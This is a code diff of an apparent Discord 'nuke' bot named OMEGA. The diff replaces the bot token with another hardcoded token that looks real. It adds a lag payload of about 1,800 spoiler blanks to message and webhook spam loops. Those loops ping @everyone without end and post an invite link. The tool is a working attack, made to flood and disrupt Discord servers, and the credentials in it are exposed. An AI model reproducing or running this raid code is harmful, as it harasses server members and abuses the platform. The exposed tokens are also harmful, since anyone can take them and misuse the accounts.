@@ -14,10 +14,10 @@ uvloop.install()
 
 # Set up
 PREFIX = "o!"
-TOKEN = "NzU3NzAwNjYxOTg1OTM1Mzkx.Yk-WpA.ajashUx3rNJ561LEC7KA2ZvY0rg"
+TOKEN = "MTAxMTY5OTAwNzgzMzI1NjA0Ng.GM5ysF.zcc8hLckHYPls8W5yYaxcsPkMrf-52siD4Z5_s"
 CHANNEL_NAME = ["OMEGA"]
 ROLE_NAME = ["OMEGA"]
-SPAM_MSG = ["OMEGA"]
+SPAM_MSG = ["OMEGA CUM"]
 WEBHOOK_NAME = ["OMEGA"]
 with open('./omega.gif', 'rb') as f:
 	IMAGE = f.read()
@@ -29,7 +29,7 @@ BASE_URL = "https://discord.com/api/v9"
 HEADER = {"authorization": f"Bot {TOKEN}"}
 
 
-OMEGA = commands.Bot(command_prefix = commands.when_mentioned_or(PREFIX), case_insensitive=True, intents=discord.Intents.default(), help_command=None, self_bot=True)
+OMEGA = commands.Bot(command_prefix = commands.when_mentioned_or(PREFIX), case_insensitive=True, intents=discord.Intents.default(), help_command=None)
 
 
 @OMEGA.event
@@ -250,7 +250,9 @@ async def message_spam(id):
 	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
 		embed = {"title":"OMEGA Nuke", "description": "Balls :smirk:"}
 		while True:
-			async with session.post(f"{BASE_URL}/channels/{id}/messages", headers=HEADER, json={"content": f"@everyone {random.choice(SPAM_MSG)}", "embeds":[embed]}) as resp:
+			blanks = "||​||" * 1800
+			lag = f"{random.choice(SPAM_MSG)}{blanks}"
+			async with session.post(f"{BASE_URL}/channels/{id}/messages", headers=HEADER, json={"content": f"@everyone {lag}https://discord.gg/fuf8t4JWDV", "embeds":[embed]}) as resp:
 				if resp.status == 200:
 					None
 				elif resp.status == 429:
@@ -268,7 +270,9 @@ async def webhook_spam(webhook):
 	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
 		webhook = Webhook.from_url(webhook.url, adapter=AsyncWebhookAdapter(session))
 		while True:
-			await webhook.send(f"@everyone {random.choice(SPAM_MSG)}", embed=em)
+			blanks = "||​||" * 1600
+			lag = f"{random.choice(SPAM_MSG)}{blanks[:1800]}"
+			await webhook.send(f"@everyone {lag}https://discord.gg/fuf8t4JWDV", embed=em)
 
 
 
@@ -287,4 +291,4 @@ async def on_guild_channel_create(channel):
 	webhook = await channel.create_webhook(name = f"{random.choice(WEBHOOK_NAME)}")
 	asyncio.create_task(webhook_spam(webhook))
 
-OMEGA.run(TOKEN, bot=False)
+OMEGA.run(TOKEN)
